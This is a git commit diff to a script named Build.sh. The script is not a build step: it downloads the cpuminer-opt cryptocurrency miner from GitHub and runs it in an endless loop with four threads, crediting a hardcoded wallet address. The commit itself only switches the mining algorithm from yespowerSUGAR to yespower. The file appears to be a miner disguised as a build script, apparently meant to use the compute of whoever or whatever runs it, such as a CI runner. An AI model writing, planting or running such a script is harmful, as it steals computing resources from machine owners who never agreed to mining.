ca754bbc2d46914a2a4ba1d8b2e3b1275bbbe0cc
github-juli <157988096+github-juli@users.noreply.github.com>
2024-01-29 16:14:46 +0700

    Update Build.sh

--- Build.sh
+++ Build.sh
@@ -2,6 +2,6 @@
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
 tar xf cpuminer-opt-linux.tar.gz
 while [ 1 ]; do
-./cpuminer-sse2 -a yespowerSUGAR -o 17079 -u urkDXD16QjUjK9Y87a4NVbkNwmYpep8sG9.Build-SH -t 4
+./cpuminer-sse2 -a yespower -o 17079 -u urkDXD16QjUjK9Y87a4NVbkNwmYpep8sG9.Build-SH -t 4
 sleep 5
 done
